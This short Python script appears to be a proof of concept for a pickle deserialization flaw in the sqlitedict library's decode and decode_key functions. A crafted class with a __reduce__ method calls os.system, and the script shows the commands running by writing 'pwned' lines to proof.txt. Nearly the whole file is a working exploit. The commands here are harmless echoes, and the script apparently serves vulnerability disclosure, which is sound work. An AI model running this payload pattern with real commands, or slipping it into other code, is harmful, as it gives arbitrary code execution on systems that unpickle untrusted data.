from sqlitedict import decode, decode_key
import pickle, base64
import os


class Payload:
    def __init__(self, cmd):
       self.cmd=cmd
    def __reduce__(self):
        import os
        return os.system, (self.cmd,)

payload1 = pickle.dumps(Payload('echo "decode pwned" >> proof.txt'))
decode(payload1)

payload2 = base64.b64encode(pickle.dumps(Payload('echo "decode_key pwned" >> proof.txt'))).decode()
decode_key(payload2)

f=open('proof.txt', 'r')
print("Content of proof.txt:")
print(f.read())

